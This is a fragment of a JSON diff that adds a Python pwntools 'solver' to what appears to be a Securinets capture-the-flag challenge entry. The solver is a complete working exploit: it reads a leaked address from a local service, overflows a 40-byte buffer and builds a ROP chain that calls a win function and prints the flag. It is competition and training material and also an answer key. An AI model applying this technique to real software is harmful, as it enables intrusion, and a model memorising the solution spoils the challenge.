+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\nelf = ELF(\"./main\", checksec=False)\ncontext.binary = elf\n\nio = remote(\"127.0.0.1\", 9006)\n\nio.recvuntil(b\"SIGNAL: \")\nleak = int(io.recvline(), 16)\nelf.address = leak - elf.symbols[\"leonida_relay\"]\n\nrop = ROP(elf)\n\npayload = b\"A\" * 40\npayload += p64(rop.find_gadget([\"ret\"]).address)\npayload += p64(rop.find_gadget([\"pop rdi\", \"ret\"]).address)\npayload += p64(0x4c55434941c35f)\npayload += p64(rop.find_gadget([\"pop rsi\", \"ret\"]).address)\npayload += p64(0x4a41534f4ec35e)\npayload += p64(rop.find_gadget([\"pop rdx\", \"ret\"]).address)\npayload += p64(0x43484f50c35a)\npayload += p64(elf.symbols[\"complete_the_handoff\"])\n\nio.sendlineafter(b\"MESSAGE: \", payload)\nio.recvuntil(b\"Securinets{\")\nflag = b\"Securinets{\" + io.recvuntil(b\"}\")\nprint(flag.decode())\nio.close()\n",
+    "solverLanguage": "python"
+  }
+]
